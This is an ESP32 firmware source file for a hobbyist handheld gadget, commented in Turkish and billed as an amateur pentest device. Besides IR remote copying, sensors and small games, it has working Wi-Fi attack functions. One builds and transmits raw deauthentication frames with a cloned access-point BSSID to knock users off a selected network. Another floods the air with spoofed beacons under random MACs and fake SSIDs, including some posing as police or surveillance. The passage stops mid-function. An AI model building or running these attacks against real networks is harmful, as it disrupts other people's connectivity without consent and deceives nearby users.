/*
                                          Muhammet Ayberk ARSLAN | STAX TECH | 2025
------------------------------------------------------------------------------------------------------------------------------------
<--*StarLog*--> Çok Fonksiyonlu Amatör Mobil Pentest Cihazı (v3.0 Final)
------------------------------------------------------------------------------------------------------------------------------------
*/
// gerekli kütüphaneler
#include <Adafruit_GFX.h>      // adafruit temel grafik kütüphanesi
#include <Adafruit_ST7735.h>   // ST7735 ekranımız için özel kütüphane
#include <SPI.h>               // SPI protokol kütüphanesi
#include <IRremote.hpp>        // ESP32 için IR Sensör kütüphanesi
#include <DHT.h>               // DHT sıcaklık-nem sensörü kütüphanesi
#include <ESP32Servo.h>        // ESP32 Servo kütüphanesi
#include <EEPROM.h>            // hafıza işlemleri için EEPROM kütüphanesi
#include <WiFi.h>              // Ağları taramak için WiFi kütüphanesi
#include <esp_wifi.h>          // Raw paket işlemleri için (Deauth & Beacon)
#include "soc/soc.h"
#include "soc/rtc_cntl_reg.h"

// pin tanımlamaları
// ekran pinleri
#define tft_cs    5
#define tft_reset   4
#define tft_dc    2

// EEPROM adres tanımlamaları
#define eeprom_memory 4096
#define eeprom_kontrol_degeri 0xFADF
#define eeprom_ayarlar_baslangic_adres 0
#define eeprom_ir_sinyal_baslangic_adresi 100
#define eeprom_kayitli_kodlar_kontrol_flag 50

// buton pinleri
#define button_up     13
#define button_down   12
#define button_left   14
#define button_right  27
#define button_ok 15

// IR sensör pinleri
#define ir_receiver 33
#define ir_sender 32

// DHT sensör
#define dht_pin 26
#define dht_model DHT11

// servo
#define servo_pin 25

// güç çıkışı pini
#define power_output_pin 21

// ekran ve arayüz ayarları
#define screen_width  160
#define screen_height 128
#define darkgrey 0x3186

// Renkler
#define purple tft.color565(128, 0, 128)
#define pink   tft.color565(255, 192, 203)

void draw_dht_info();

// global nesneler
Adafruit_ST7735 tft = Adafruit_ST7735(tft_cs, tft_dc, tft_reset);
DHT dht(dht_pin, dht_model);
Servo starlogservo;

// DHT sensör değişkenleri
float sicaklik = 0.0;
float nem = 0.0;
unsigned long last_dht_read = 0;
const unsigned long dht_okuma_periyot = 2000;

// servo Değişkenleri
int servo_aci = 90;
const int min_servo = 0;
const int max_servo = 180;

// --- WI-FI SALDIRI DEĞİŞKENLERİ ---
int ag_sayisi = 0;
int secili_network = 0;
String ssid_listesi[20];
int kaydirma_offset = 0;

// Deauth Paketi (26 Byte)
uint8_t deauthPacket[26] = {
  0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x07, 0x00
};
uint8_t target_bssid[6];
int target_channel = 1;
bool is_attacking = false;

// --- BEACON SPAM (TROLL LISTE) ---
// İstediğin uzun ve komik liste burası
const char* spam_ssids[] = {
  "Bedava_Wifi_Tikla", "MİT_Dinleme_Araci_34", "Komsunun_Wifi",
  "Girme_Virus_Var", "Polis_Ozel_Harekat", "Cami_Wifi",
  "Bobrek_Mafyasi", "Sifre_12345", "Baglanma_Yanarsin",
  "FBI_Surveillance_Van", "System32_Error", "Trojan_Downloader",
  "Karicim_Seni_Seviyorum", "Borcunu_Ode_Ahmet", "Satilik_Arsa",
  "5G_Test_Istasyonu", "Covid_19_Asi_Cipi", "Hacked_By_STAX",
  "Ankara_Merkez_Dinleme", "Sakin_Tiklama"
};
#define SPAM_SSID_COUNT 20

// Beacon Spam Değişkenleri
bool is_beacon_spamming = false;
uint8_t beaconPacket[128] = {
  0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x64, 0x00, 0x11, 0x04, 0x00
};

// güç çıkışı değişkenleri
bool power_output_durumu = false;

// ekran yenileme optimizasyonu
bool screen_needs_update = true;
unsigned long son_ekran_cizim_zamani = 0;

// uygulama durumları (state machine)
enum app_state {
  STATE_MAIN_MENU,
  STATE_IR_REMOTE_MENU,
  STATE_IR_REMOTE_SCAN,
  STATE_IR_REMOTE_SAVED_LIST,
  STATE_OTHER_TOOLS_MENU,
  STATE_SERVO_CONTROL,
  STATE_POWER_OUTPUT,
  STATE_GAMES_MENU,
  STATE_GAME_SNAKE,
  STATE_GAME_PONG,
  STATE_GAME_GUESS_NUMBER,
  STATE_SETTINGS_MENU,
  STATE_SETTINGS_COLOR_MENU,
  STATE_WIFI_TOOLS_MENU,
  STATE_WIFI_DEAUTH_SCAN_MENU,
  STATE_WIFI_DEAUTH_ATTACK,
  STATE_WIFI_BEACON_SPAM
};
app_state CURRENTSTATE = STATE_MAIN_MENU;

// IR structları
struct sinyal {
  char name[25];
  uint32_t command;
  uint16_t address;
  uint8_t protocol;
  uint8_t bit_number;
  bool isEmpty = true;
};

struct tv_ir_kodlari {
  const char* name;
  uint32_t command;
  uint16_t address;
  uint8_t protocol;
  uint8_t bit_number;
};

const tv_ir_kodlari kayitli_ir_kodlari[] = {
  {"Samsung TV", 0x02, 0x0707, NEC, 32},
  {"Samsung Smart", 0x98, 0x0707, NEC, 32},
  {"Samsung UE", 0x40, 0x0707, NEC, 32},
  {"LG TV", 0x08, 0x04FB, NEC, 32},
  {"LG Smart", 0x10, 0x04FB, NEC, 32},
  {"Sony TV", 0x15, 0x01, SONY, 12},
  {"Vestel TV", 0x12, 0x1FE4, NEC, 32},
  {"Philips TV", 0x0C, 0x00, RC5, 13},
  {"TCL TV", 0x02, 0x1FE4, NEC, 32},
  {"Xiaomi TV", 0x02, 0xFB04, NEC, 32},
  {"Epson Proj (Power)", 0xB946, 0x55AA, NEC, 32},
  {"Epson Proj (On)", 0xF708, 0x0707, NEC, 32},
  {"Epson Proj (Off)", 0xF609, 0x0707, NEC, 32},
};
#define predefined_tv_codes_sayisi (sizeof(kayitli_ir_kodlari) / sizeof(tv_ir_kodlari))

struct ayarlar_uygulamasi {
  uint16_t random_number;
  uint16_t bgcolor;
  uint16_t textcolor;
  uint16_t highlightcolor;
  uint16_t accentcolor;
  uint16_t dhtcolor;
  uint16_t headertextcolor;
  uint8_t kayitli_sinyal_sayisi;
};

#define max_sinyal_sayisi 50
sinyal kayitli_sinyaller[max_sinyal_sayisi];
int kayitli_sinyal_sayisi = 0;
uint32_t alinan_sinyal_komut = 0;
uint16_t alinan_sinyal_adres = 0;
uint8_t alinan_sinyal_protokol = 0;
uint8_t alinan_sinyal_bit = 0;
bool alinabilir_sinyal = false;

// menü kontrol değişkenleri
int mainmenu_selection = 0;
int irmenu_selection = 0;
int irlist_selection = 0;
int othertoolsmenu_selection = 0;
int gamesmenu_selection = 0;
int settingsmenu_selection = 0;
int settingscolormenu_selection = 0;
int wifitoolsmenu_selection = 0;
int list_scroll_offset = 0;

// ui ayarları
uint16_t ui_bgcolor       = ST77XX_BLACK;
uint16_t ui_textcolor     = ST77XX_WHITE;
uint16_t ui_highlightcolor = 0x0ee2;
uint16_t ui_accentcolor    = 0x0ee2;
uint16_t dhttextcolor    = ST77XX_YELLOW;
uint16_t ui_headertextcolor = ui_accentcolor;

// renkler
const uint16_t colors[] = {ST77XX_WHITE, ST77XX_RED, ST77XX_GREEN, ST77XX_BLUE, ST77XX_CYAN, ST77XX_MAGENTA, ST77XX_YELLOW, ST77XX_ORANGE, purple, pink};
const char* color_names[] = {"Beyaz", "Kirmizi", "Yesil", "Mavi", "Camgogu", "Eflatun", "Sari", "Turuncu", "Mor", "Pembe"};
#define colors_num (sizeof(colors) / sizeof(uint16_t))

// menü başlıkları
const char *mainmenu_items[] = {"IR Copier", "WI-FI Araclar", "Diger Araclar", "Ayarlar"};
const int mainmenu_items_count = 4;
const char *irmenu_items[] = {"Yeni Sinyal Tara", "Kayitli Sinyaller", "Ana Menu"};
const int irmenu_items_count = 3;
const char *othertoolsmenu_items[] = {"Servo Kontrol", "Guc Cikisi", "Oyunlar", "Ana Menu"};
const int othertoolsmenu_items_count = 4;
const char *gamesmenu_items[] = {"Snake", "Sayi Tahmin", "Pong", "Geri"};
const int gamesmenu_items_count = 4;
const char *settingsMenuItems[] = {"Vurgu Rengi", "Baslik Rengi", "DHT Rengi", "Ana Menu"};
const int settingsmenu_items_count = 4;
const char *wifitoolsmenu_items[] = {"Deauther (Saldiri)", "Beacon Spam (Sahte)", "Geri"};
const int wifitoolsmenu_items_count = 3;

// oyun değişkenleri
int hedefsayi, currentnumber, denemesayisi;
// snake
#define SNAKE_MAX_LENGTH 100
#define SNAKE_BLOCK_SIZE 5
#define SNAKE_START_X screen_width / 2
#define SNAKE_START_Y screen_height / 2
struct Point { int x; int y; };
Point snake[SNAKE_MAX_LENGTH];
int snakeLength, snakeDirection, snakeScore;
Point food;
bool snakeGameOver;
// pong
#define PADDLE_WIDTH 5
#define PADDLE_HEIGHT 20
#define BALL_SIZE 5
int paddleY, ballX, ballY, ballDirX, ballDirY, pongScore;
bool pongGameOver;

// debounce
unsigned long lastButtonPressTime[5] = {0};
const long debouncedelay = 150;
bool lastbuttonstate[5] = {false};

// açılış ekranı
void acilisekrani() {
  tft.fillScreen(ui_bgcolor);
  tft.setTextSize(1);
  tft.setTextColor(ui_accentcolor);
  tft.setCursor(70, 40);
  tft.print("STAX");
  tft.setCursor(55, 52);
  tft.print("<StarLog>");

  String creditText = "Developed by Ayberk Arslan";
  int16_t x1, y1; uint16_t w, h;
  tft.getTextBounds(creditText, 0, 0, &x1, &y1, &w, &h);
  tft.setCursor((screen_width - w) / 2, screen_height - 10);
  tft.print(creditText);
  delay(3000);
}

// --- WI-FI FONKSİYONLARI ---

void scan_wifi_networks() {
  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect();
  WiFi.scanNetworks(false, true);
}

// Saldırı Paketi Gönderme
void send_deauth_packets() {
  for (int i = 0; i < 6; i++) {
    deauthPacket[10 + i] = target_bssid[i]; // Source (Modem Adı)
    deauthPacket[16 + i] = target_bssid[i]; // BSSID (Modem Adı)
  }

  // Kanal Ayarı
  esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);

  // WIFI_IF_AP (AP Modu) ile gönderiyoruz.
  // MAC klonlama yaptığımız için sürücü hata vermeyecek.
  esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), true);

  if (result != ESP_OK) {
      // Hata varsa yaz
      Serial.print("HATA: ");
      Serial.println(result);
  }

  delay(10);
}

// Beacon Spam (Sahte Ağlar) Fonksiyonu
void send_beacon_spam() {
    int ssid_index = random(SPAM_SSID_COUNT);
    String ssid_name = spam_ssids[ssid_index];

    uint8_t random_mac[6];
    esp_fill_random(random_mac, 6);
    random_mac[0] &= 0xFE;
    random_mac[0] |= 0x02;

    for (int i = 0; i < 6; i++) {
        beaconPacket[10 + i] = random_mac[i];
        beaconPacket[16 + i] = random_mac[i];
    }

    int ssid_len = ssid_name.length();
    beaconPacket[37] = ssid_len;

    for(int i=0; i<ssid_len; i++) {
        beaconPacket[38 + i] = ssid_name[i];
    }

    int packetSize = 38 + ssid_len;

    int ch = random(1, 12);
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

    // Beacon'lar için de AP arayüzü
    esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, packetSize, true);
    delay(10);
}

void draw_dht_info() {
  tft.fillRect(0, screen_height - 12, screen_width, 12, ui_bgcolor);
  tft.setTextSize(1);
  tft.setTextColor(dhttextcolor);
  char dht_buffer[20];
  sprintf(dht_buffer, "%dC %%%d", (int)sicaklik, (int)nem);
  int16_t x1, y1; uint16_t w, h;
  tft.getTextBounds(dht_buffer, 0, 0, &x1, &y1, &w, &h);
  tft.setCursor((screen_width - w) / 2, screen_height - 10);
  tft.print(dht_buffer);
}

void read_dht_sensor() {
  unsigned long current_time = millis();
  if (current_time - last_dht_read >= dht_okuma_periyot) {
    float newTemp = dht.readTemperature();
    float newHum = dht.readHumidity();
    if (!isnan(newTemp) && !isnan(newHum)) {
      if (abs(newTemp - sicaklik) > 0.5 || abs(newHum - nem) > 1.0) {
        sicaklik = newTemp; nem = newHum; screen_needs_update = true;
      }
    }
    last_dht_read = current_time;
  }
}

// EEPROM Fonksiyonları
void save_settings_to_eeprom() {
  ayarlar_uygulamasi settings;
  settings.random_number = eeprom_kontrol_degeri;
  settings.bgcolor = ui_bgcolor; settings.textcolor = ui_textcolor;
  settings.highlightcolor = ui_highlightcolor; settings.accentcolor = ui_accentcolor;
  settings.dhtcolor = dhttextcolor; settings.headertextcolor = ui_headertextcolor;
  settings.kayitli_sinyal_sayisi = kayitli_sinyal_sayisi;
  EEPROM.put(eeprom_ayarlar_baslangic_adres, settings);
  EEPROM.commit();
}

void load_settings_from_eeprom() {
  ayarlar_uygulamasi settings;
  EEPROM.get(eeprom_ayarlar_baslangic_adres, settings);
  if (settings.random_number == eeprom_kontrol_degeri) {
    ui_bgcolor = settings.bgcolor; ui_textcolor = settings.textcolor;
    ui_highlightcolor = settings.highlightcolor; ui_accentcolor = settings.accentcolor;
    dhttextcolor = settings.dhtcolor; ui_headertextcolor = settings.headertextcolor;
    kayitli_sinyal_sayisi = settings.kayitli_sinyal_sayisi;
  } else {
    ui_bgcolor = ST77XX_BLACK; ui_textcolor = ST77XX_WHITE;
    ui_highlightcolor = 0x0ee2; ui_accentcolor = 0x0ee2;
    dhttextcolor = ST77XX_YELLOW; ui_headertextcolor = 0x0ee2;
    kayitli_sinyal_sayisi = 0;
  }
}

void save_signals_to_eeprom() {
  int address = eeprom_ir_sinyal_baslangic_adresi;
  for (int i = 0; i < kayitli_sinyal_sayisi; i++) {
    EEPROM.put(address, kayitli_sinyaller[i]);
    address += sizeof(sinyal);
  }
  EEPROM.commit();
}

void load_signals_from_eeprom() {
  if (kayitli_sinyal_sayisi > 0) {
    int address = eeprom_ir_sinyal_baslangic_adresi;
    for (int i = 0; i < kayitli_sinyal_sayisi; i++) {
      EEPROM.get(address, kayitli_sinyaller[i]);
      address += sizeof(sinyal);
    }
  }
}

void load_pre_tv_codes() {
  uint16_t tv_codes_loaded_control;
  EEPROM.get(eeprom_kayitli_kodlar_kontrol_flag, tv_codes_loaded_control);
  if (tv_codes_loaded_control == eeprom_kontrol_degeri) return;

  int user_signal_count = kayitli_sinyal_sayisi;
  sinyal user_signals[max_sinyal_sayisi];
  for (int i = 0; i < user_signal_count; i++) user_signals[i] = kayitli_sinyaller[i];

  int eklenen_tv_kodlari_sayisi = 0;
  for (int i = 0; i < predefined_tv_codes_sayisi && eklenen_tv_kodlari_sayisi < max_sinyal_sayisi; i++) {
    strcpy(kayitli_sinyaller[eklenen_tv_kodlari_sayisi].name, kayitli_ir_kodlari[i].name);
    kayitli_sinyaller[eklenen_tv_kodlari_sayisi].command = kayitli_ir_kodlari[i].command;
    kayitli_sinyaller[eklenen_tv_kodlari_sayisi].address = kayitli_ir_kodlari[i].address;
    kayitli_sinyaller[eklenen_tv_kodlari_sayisi].protocol = kayitli_ir_kodlari[i].protocol;
    kayitli_sinyaller[eklenen_tv_kodlari_sayisi].bit_number = kayitli_ir_kodlari[i].bit_number;
    kayitli_sinyaller[eklenen_tv_kodlari_sayisi].isEmpty = false;
    eklenen_tv_kodlari_sayisi++;
  }
  int total_signals = eklenen_tv_kodlari_sayisi;
  for (int i = 0; i < user_signal_count && total_signals < max_sinyal_sayisi; i++) {
    kayitli_sinyaller[total_signals] = user_signals[i]; total_signals++;
  }
  kayitli_sinyal_sayisi = total_signals;
  save_settings_to_eeprom(); save_signals_to_eeprom();
  EEPROM.put(eeprom_kayitli_kodlar_kontrol_flag, eeprom_kontrol_degeri); EEPROM.commit();
}

// UI ÇİZİM
void draw_horizontal_menu(const char* items[], int itemCount, int selection) {
    tft.fillScreen(ui_bgcolor);
    tft.setTextSize(1); tft.setTextColor(ui_headertextcolor);
    int16_t x1, y1; uint16_t w, h;
    tft.getTextBounds("<StarLog>", 0, 0, &x1, &y1, &w, &h);
    tft.setCursor((screen_width - w) / 2, 15); tft.print("<StarLog>");

    tft.setTextSize(1);
    const char* selected_item = items[selection];
    tft.getTextBounds(selected_item, 0, 0, &x1, &y1, &w, &h);
    int rect_width = w + 20; int rect_height = h + 12;
    int rect_x = (screen_width - rect_width) / 2;
    int rect_y = (screen_height - rect_height) / 2;

    tft.fillRoundRect(rect_x, rect_y, rect_width, rect_height, 5, ui_highlightcolor);
    tft.setTextColor(ui_bgcolor);
    tft.setCursor(rect_x + 10, rect_y + 8); tft.print(selected_item);

    tft.setTextSize(2); tft.setTextColor(ui_textcolor);
    tft.setCursor(10, rect_y + 2); tft.print("<");
    tft.setCursor(screen_width - 20, rect_y + 2); tft.print(">");
    draw_dht_info(); screen_needs_update = false;
}

void draw_mainmenu() { draw_horizontal_menu(mainmenu_items, mainmenu_items_count, mainmenu_selection); }
void draw_irremotemenu() { draw_horizontal_menu(irmenu_items, irmenu_items_count, irmenu_selection); }
void draw_othertoolsmenu() { draw_horizontal_menu(othertoolsmenu_items, othertoolsmenu_items_count, othertoolsmenu_selection); }
void draw_gamesmenu() { draw_horizontal_menu(gamesmenu_items, gamesmenu_items_count, gamesmenu_selection); }
void draw_settingsmenu() { draw_horizontal_menu(settingsMenuItems, settingsmenu_items_count, settingsmenu_selection); }
void draw_wifitoolsmenu() { draw_horizontal_menu(wifitoolsmenu_items, wifitoolsmenu_items_count, wifitoolsmenu_selection); }

void draw_wifi_scan_menu() {
    tft.fillScreen(ui_bgcolor);
    tft.setTextSize(1); tft.setTextColor(ui_headertextcolor);
    tft.setCursor(45, 10); tft.print("STAX <StarLog>");

    int maxvisibleitems = 4;
    int startindex = kaydirma_offset;
    int endindex = min(startindex + maxvisibleitems, ag_sayisi);

    if (ag_sayisi == 0) {
        tft.setCursor(30, 60); tft.setTextColor(ST77XX_RED); tft.print("Hic ag bulunamadi.");
    } else {
        for (int i = startindex; i < endindex; i++) {
            int displayIndex = i - startindex;
            int y = 40 + displayIndex * 20;
            if (i == secili_network) {
                tft.fillRect(5, y - 5, screen_width - 10, 18, ui_highlightcolor); tft.setTextColor(ui_bgcolor);
            } else {
                tft.fillRect(5, y - 5, screen_width - 10, 18, ui_bgcolor); tft.setTextColor(ui_textcolor);
            }
            tft.setCursor(15, y); tft.print(ssid_listesi[i]);
        }
    }
    draw_dht_info(); screen_needs_update = false;
}

void draw_deauth_attack_screen() {
    tft.fillScreen(ST77XX_RED);
    tft.setTextColor(ST77XX_WHITE);
    tft.setTextSize(2);
    tft.setCursor(10, 20); tft.print("SALDIRI!");

    tft.setTextSize(1);
    tft.setCursor(10, 50); tft.print("Hedef:");
    tft.setCursor(10, 65); tft.print(ssid_listesi[secili_network]);

    tft.setCursor(10, 90); tft.print("Paketler basiliyor...");
    tft.setCursor(10, 115); tft.setTextColor(ST77XX_YELLOW); tft.print("< DURDUR: Sol Buton");

    draw_dht_info(); screen_needs_update = false;
}

void draw_beacon_spam_screen() {
    tft.fillScreen(ST77XX_MAGENTA);
    tft.setTextColor(ST77XX_WHITE);
    tft.setTextSize(2);
    tft.setCursor(10, 20); tft.print("SAHTE AG");
    tft.setCursor(10, 40); tft.print("SALDIRISI");

    tft.setTextSize(1);
    tft.setCursor(10, 70); tft.print("Rastgele SSID'ler");
    tft.setCursor(10, 85); tft.print("yayiliyor...");

    tft.setCursor(10, 115); tft.setTextColor(ST77XX_YELLOW); tft.print("< DURDUR: Sol Buton");
    draw_dht_info(); screen_needs_update = false;
}

// Diğer Çizimler
void draw_numbergamescreen(const char* message) {
    tft.fillScreen(ui_bgcolor);
    tft.setTextSize(1); tft.setTextColor(ui_headertextcolor);
    tft.setCursor(10, 10); tft.print("Sayi Tahmin Oyunu");
    tft.drawFastHLine(0, 25, screen_width, darkgrey);
    tft.setTextSize(1); tft.setTextColor(ui_textcolor);
    tft.setCursor(10, 40); tft.print("Tahmin: "); tft.print(currentnumber);
    tft.setCursor(10, 60); tft.print("Deneme: "); tft.print(denemesayisi);
    tft.setCursor(10, 80); tft.print(message);
    tft.setCursor(10, 110); tft.setTextColor(ST77XX_RED); tft.print("< Geri");
    draw_dht_info(); screen_needs_update = false;
}

void draw_snakescreen() {
    tft.fillScreen(ui_bgcolor);
    tft.setTextSize(1); tft.setTextColor(ui_headertextcolor);
    tft.setCursor(10, 5); tft.print("Skor: "); tft.print(snakeScore);
    if (snakeGameOver) {
        tft.setTextSize(2); tft.setTextColor(ST77XX_RED);
        tft.setCursor(10, 50); tft.print("OYUN BITTI!");
        tft.setTextSize(1); tft.setTextColor(ST77XX_CYAN);
        tft.setCursor(10, 80); tft.print("Skorunuz: "); tft.print(snakeScore);
    } else {
        tft.fillRoundRect(food.x, food.y, SNAKE_BLOCK_SIZE, SNAKE_BLOCK_SIZE, 1, ST77XX_YELLOW);
        for (int i = 0; i < snakeLength; i++) tft.fillRoundRect(snake[i].x, snake[i].y, SNAKE_BLOCK_SIZE, SNAKE_BLOCK_SIZE, 1, ST77XX_GREEN);
    }
    tft.setTextSize(1); tft.setTextColor(ST77XX_RED); tft.setCursor(10, 110); tft.print("< Geri");
    draw_dht_info(); screen_needs_update = false;
}

void draw_pongscreen() {
    tft.fillScreen(ui_bgcolor);
    tft.setTextSize(1); tft.setTextColor(ui_headertextcolor);
    tft.setCursor(10, 5); tft.print("Skor: "); tft.print(pongScore);
    if (pongGameOver) {
        tft.setTextSize(2); tft.setTextColor(ST77XX_RED);
        tft.setCursor(10, 50); tft.print("OYUN BITTI!");
        tft.setTextSize(1); tft.setTextColor(ST77XX_CYAN);
        tft.setCursor(10, 80); tft.print("Skorunuz: "); tft.print(pongScore);
    } else {
        tft.fillRect(5, paddleY, PADDLE_WIDTH, PADDLE_HEIGHT, ui_highlightcolor);
        tft.fillRect(screen_width - 5 - PADDLE_WIDTH, paddleY, PADDLE_WIDTH, PADDLE_HEIGHT, ui_highlightcolor);
        tft.fillRect(ballX, ballY, BALL_SIZE, BALL_SIZE, ST77XX_WHITE);
    }
    tft.setTextSize(1); tft.setTextColor(ST77XX_RED); tft.setCursor(10, 110); tft.print("< Geri");
    draw_dht_info(); screen_needs_update = false;
}

void draw_settings_color_menu(int selectedoption) {
    tft.fillScreen(ui_bgcolor);
    tft.setTextSize(1); tft.setTextColor(ui_headertextcolor);
    tft.setCursor(20, 10); tft.print(settingsMenuItems[selectedoption]);
    tft.drawFastHLine(0, 25, screen_width, darkgrey);
    int maxvisibleitems = 5;
    int startindex = list_scroll_offset;
    int endindex = min(startindex + maxvisibleitems, (int)colors_num);
    for (int i = startindex; i < endindex; i++) {
        int displayIndex = i - startindex;
        int y = 35 + displayIndex * 16;
        if (i == settingscolormenu_selection) {
            tft.fillRect(5, y - 4, screen_width - 10, 14, ui_highlightcolor); tft.setTextColor(ui_bgcolor);
        } else {
            tft.fillRect(5, y - 4, screen_width - 10, 14, ui_bgcolor); tft.setTextColor(colors[i]);
        }
        tft.setCursor(15, y); tft.print(color_names[i]);
    }
    draw_dht_info(); screen_needs_update = false;
}

void draw_servo_control_screen() {
  tft.fillScreen(ui_bgcolor);
  tft.setTextSize(1); tft.setTextColor(ui_headertextcolor);
  tft.setCursor(45, 10); tft.print("Servo Kontrol");
  tft.drawFastHLine(0, 30, screen_width, darkgrey);
  tft.setTextSize(1); tft.setTextColor(ST77XX_GREEN);
  tft.setCursor(10, 50); tft.print("Aci: "); tft.print(servo_aci); tft.print(" derece");
  tft.setTextSize(1); tft.setTextColor(ui_textcolor);
  tft.setCursor(10, 75); tft.print("Yukari/Asagi: Aci ayarla");
  tft.setCursor(10, 100); tft.setTextColor(ST77XX_RED); tft.print("< Geri: Sol Buton");
  draw_dht_info(); screen_needs_update = false;
}

void draw_power_output_screen() {
  tft.fillScreen(ui_bgcolor);
  tft.setTextSize(1); tft.setTextColor(ui_headertextcolor);
  tft.setCursor(50, 10); tft.print("Guc Cikisi");
  tft.drawFastHLine(0, 30, screen_width, darkgrey);
  int buttonwidth = 100; int buttonheight = 30;
  int buttonX = (screen_width - buttonwidth) / 2; int buttonY = 60;
  if (power_output_durumu) {
    tft.fillRoundRect(buttonX, buttonY, buttonwidth, buttonheight, 8, ST77XX_GREEN);
    tft.setTextColor(ui_bgcolor); tft.setTextSize(2); tft.setCursor(buttonX + 25, buttonY + 8); tft.print("ACIK");
  } else {
    tft.fillRoundRect(buttonX, buttonY, buttonwidth, buttonheight, 8, ST77XX_RED);
    tft.setTextColor(ui_bgcolor); tft.setTextSize(2); tft.setCursor(buttonX + 15, buttonY + 8); tft.print("KAPALI");
  }
  tft.setTextSize(1); tft.setTextColor(ui_textcolor);
  tft.setCursor(20, 45); tft.print("OK: Durumu Degistir");
  tft.setCursor(10, 100); tft.setTextColor(ST77XX_RED); tft.print("< Geri: Sol Buton");
  draw_dht_info(); screen_needs_update = false;
}

void draw_scan_screen(bool waiting) {
  tft.fillScreen(ui_bgcolor);
  tft.setTextSize(1); tft.setTextColor(ui_headertextcolor);
  tft.setCursor(20, 10); tft.print("Sinyal Tarama");
  tft.drawFastHLine(0, 30, screen_width, darkgrey);
  tft.setTextSize(1);
  if (waiting) {
    tft.setCursor(10, 50); tft.setTextColor(ST77XX_YELLOW); tft.print("Aliciya bir sinyal");
    tft.setCursor(10, 70); tft.print("gonderin...");
  } else {
    tft.setCursor(10, 50); tft.setTextColor(ST77XX_GREEN); tft.print("Sinyal Alindi!");
    tft.setCursor(10, 70); tft.setTextColor(ui_textcolor);
    tft.print("Kod: 0x"); tft.print(alinan_sinyal_komut, HEX);
    tft.setCursor(10, 110); tft.setTextColor(ui_highlightcolor); tft.print("Kaydet: OK Buton");
  }
  tft.setCursor(10, 95); tft.setTextColor(ST77XX_RED); tft.print("< Geri: Sol Buton");
  draw_dht_info(); screen_needs_update = false;
}

void draw_saved_list_screen() {
    tft.fillScreen(ui_bgcolor);
    tft.setTextSize(1); tft.setTextColor(ui_headertextcolor);
    tft.setCursor(10, 10); tft.print("Kayitli Sinyaller ("); tft.print(kayitli_sinyal_sayisi); tft.print(")");
    tft.drawFastHLine(0, 25, screen_width, darkgrey);
    if (kayitli_sinyal_sayisi == 0) {
        tft.setCursor(20, 60); tft.setTextColor(ST77XX_RED); tft.print("Kayitli sinyal yok!");
    } else {
        int maxvisibleitems = 4;
        int startindex = list_scroll_offset;
        int endindex = min(startindex + maxvisibleitems, kayitli_sinyal_sayisi);
        for (int i = startindex; i < endindex; i++) {
            int displayIndex = i - startindex;
            int y = 35 + displayIndex * 22;
            if (i == irlist_selection) {
                tft.fillRect(5, y - 5, screen_width - 10, 20, ui_highlightcolor); tft.setTextColor(ui_bgcolor);
            } else {
                tft.fillRect(5, y - 5, screen_width - 10, 20, ui_bgcolor); tft.setTextColor(ui_textcolor);
            }
            tft.setCursor(10, y-2); tft.print(kayitli_sinyaller[i].name);
            tft.setCursor(10, y + 7); char buffer[40];
            sprintf(buffer, "P:%d C:0x%X", kayitli_sinyaller[i].protocol, kayitli_sinyaller[i].command); tft.print(buffer);
        }
    }
    tft.setCursor(10, 115); tft.setTextColor(ui_textcolor); tft.print("<Geri | OK:Gonder | >Sil");
    draw_dht_info(); screen_needs_update = false;
}

// YARDIMCI FONKSİYONLAR
void set_power_output(bool state) {
  power_output_durumu = state;
  digitalWrite(power_output_pin, state ? HIGH : LOW);
}

bool is_button_pressed(int buttonpin) {
  int buttonindex = -1;
  switch(buttonpin) {
    case button_up: buttonindex = 0; break;
    case button_down: buttonindex = 1; break;
    case button_left: buttonindex = 2; break;
    case button_right: buttonindex = 3; break;
    case button_ok: buttonindex = 4; break;
    default: return false;
  }
  bool CURRENTSTATE = digitalRead(buttonpin) == LOW;
  unsigned long current_time = millis();
  if (CURRENTSTATE && !lastbuttonstate[buttonindex] && (current_time - lastButtonPressTime[buttonindex] > debouncedelay)) {
    lastButtonPressTime[buttonindex] = current_time; lastbuttonstate[buttonindex] = true; screen_needs_update = true; return true;
  }
  if (!CURRENTSTATE && lastbuttonstate[buttonindex]) lastbuttonstate[buttonindex] = false;
  return false;
}

// MENÜ KONTROLLERİ
void handle_main_menu() {
    if (is_button_pressed(button_left)) mainmenu_selection = (mainmenu_selection - 1 + mainmenu_items_count) % mainmenu_items_count;
    if (is_button_pressed(button_right)) mainmenu_selection = (mainmenu_selection + 1) % mainmenu_items_count;
    if (is_button_pressed(button_ok)) {
        switch (mainmenu_selection) {
            case 0: CURRENTSTATE = STATE_IR_REMOTE_MENU; break;
            case 1: CURRENTSTATE = STATE_WIFI_TOOLS_MENU; break;
            case 2: CURRENTSTATE = STATE_OTHER_TOOLS_MENU; break;
            case 3: CURRENTSTATE = STATE_SETTINGS_MENU; break;
        }
    }
}

// Wi-Fi Araçlar Menüsü
void handle_wifi_tools_menu() {
    if (is_button_pressed(button_left)) wifitoolsmenu_selection = (wifitoolsmenu_selection - 1 + wifitoolsmenu_items_count) % wifitoolsmenu_items_count;
    if (is_button_pressed(button_right)) wifitoolsmenu_selection = (wifitoolsmenu_selection + 1) % wifitoolsmenu_items_count;
    if (is_button_pressed(button_ok)) {
        switch (wifitoolsmenu_selection) {
            case 0: // Deauther
                WiFi.mode(WIFI_MODE_STA);
                WiFi.disconnect();
                CURRENTSTATE = STATE_WIFI_DEAUTH_SCAN_MENU;
                tft.fillScreen(ui_bgcolor); tft.setTextColor(ST77XX_YELLOW);
                tft.setCursor(10, 60); tft.print("Aglar taraniyor...");
                scan_wifi_networks();
                break;
            case 1: // Beacon Spam
                WiFi.mode(WIFI_MODE_AP); // AP Modu Şart
                CURRENTSTATE = STATE_WIFI_BEACON_SPAM;
                is_beacon_spamming = true;
                break;
